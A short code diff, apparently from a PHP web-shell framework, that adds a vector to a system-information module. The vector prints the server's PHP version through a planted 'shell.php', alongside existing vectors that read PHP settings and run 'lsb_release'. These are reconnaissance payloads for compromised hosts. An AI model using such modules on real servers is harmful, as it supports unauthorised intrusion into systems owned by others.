@@ -33,7 +33,7 @@ class Info(Module):
             self.support_vectors.add_vector('max_execution_time', 'shell.php', '@print(ini_get("max_execution_time"));'),
             self.support_vectors.add_vector('php_self', 'shell.php', '@print($_SERVER["PHP_SELF"]);')
             self.support_vectors.add_vector('dir_sep' , 'shell.php',  '@print(DIRECTORY_SEPARATOR);')
-    
+            self.support_vectors.add_vector('php_version' , 'shell.php',  "$v=''; if(function_exists( 'phpversion' )) { $v=phpversion(); } elseif(defined('PHP_VERSION')) { $v=PHP_VERSION; } elseif(defined('PHP_VERSION_ID')) { $v=PHP_VERSION_ID; } print($v);")
     
             self.release_support_vectors = VectorsDict(self.modhandler)
             self.release_support_vectors.add_vector('lsb_release' , 'shell.sh',  'lsb_release -d')
